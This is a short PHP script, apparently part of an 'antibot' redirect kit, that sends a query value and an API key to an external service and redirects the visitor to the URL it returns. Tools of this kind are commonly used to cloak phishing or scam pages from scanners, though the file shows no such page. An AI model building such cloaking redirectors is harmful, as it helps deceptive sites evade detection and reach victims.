<?php
require_once('autoload.php');
/**
 * @Author: Nokia 1337
 * @Date:   2019-09-13 18:55:48
 * @Last Modified by:   Nokia 1337
 * @Last Modified time: 2019-09-30 21:24:46
*/
if($_GET['query']){
    $respons = $Antibot->redirect( $config['apikey'] , $_GET['query']);
    $json    = $Antibot->json($respons);
    if($json['status'] == false){
        $Antibot->error(100 , $json['message']);
    }
    if(empty($json['direct_url'])){
        $Antibot->error(404);
    }
    die(header("Location: ".$json['direct_url']));
}else{
    $Antibot->error(404);
}